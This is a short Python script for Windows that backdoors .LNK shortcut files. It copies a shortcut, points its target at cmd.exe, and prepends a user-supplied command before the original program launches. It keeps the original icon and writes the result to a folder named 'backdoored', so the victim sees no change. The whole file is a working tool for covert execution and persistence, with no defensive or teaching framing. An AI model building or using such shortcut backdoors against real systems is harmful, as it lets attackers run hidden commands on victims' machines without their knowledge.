import os
import sys
import shutil
import argparse
import win32com.client

def modify_shortcut(lnk_file, new_command=None, output_folder=None):
    # Ensure the input LNK file exists
    if not os.path.exists(lnk_file):
        print(f"Error: The file '{lnk_file}' does not exist.")
        sys.exit(1)

    # Create the output folder if it doesn't exist
    if not os.path.exists(output_folder):
        os.makedirs(output_folder)

    # Copy the original LNK file to the output folder
    new_file_name = os.path.basename(lnk_file)
    output_path = os.path.join(output_folder, new_file_name)

    try:
        shutil.copy2(lnk_file, output_path)
        print(f"Copied '{lnk_file}' to '{output_path}'")
    except Exception as e:
        print(f"Error copying file: {e}")
        sys.exit(1)

    # Create a shell object to interact with the copied LNK file
    shell = win32com.client.Dispatch("WScript.Shell")
    
    # Load the copied shortcut file
    shortcut = shell.CreateShortcut(output_path)

    # Retrieve original target, arguments, and icon location
    original_target = shortcut.TargetPath
    original_arguments = shortcut.Arguments
    original_icon = shortcut.IconLocation

    # Prompt the user to input the new command without escaping
    if not new_command:
        new_command = input("Enter the new command to be injected (input as a literal, no escaping needed): ")

    # Set TargetPath to cmd.exe to run commands via shell
    shortcut.TargetPath = r"C:\Windows\system32\cmd.exe"
    
    # Set Arguments to first run the new command minimized, then the original target and arguments
    dynamic_command = f'{new_command} & start "" "{original_target}" "{original_arguments}"'
    print(f"Setting arguments to: {dynamic_command}")
    shortcut.Arguments = dynamic_command

    # Set the IconLocation to the original icon
    shortcut.IconLocation = original_icon

    # Set the "Start In" field (WorkingDirectory) to be blank
    shortcut.WorkingDirectory = ""

    # Save the modified shortcut
    shortcut.Save()
    print(f"Shortcut '{output_path}' updated successfully with injected command.")

if __name__ == "__main__":
    # Set up argument parsing
    parser = argparse.ArgumentParser(description="Modify .LNK file's command and arguments.")
    parser.add_argument("lnk_file", help="Path to the .LNK file")
    parser.add_argument("-o", "--output", help="Output location folder", default="backdoored")

    args = parser.parse_args()

    # Modify the shortcut with the command string provided via prompt, saving to the backdoored folder
    modify_shortcut(args.lnk_file, None, args.output)
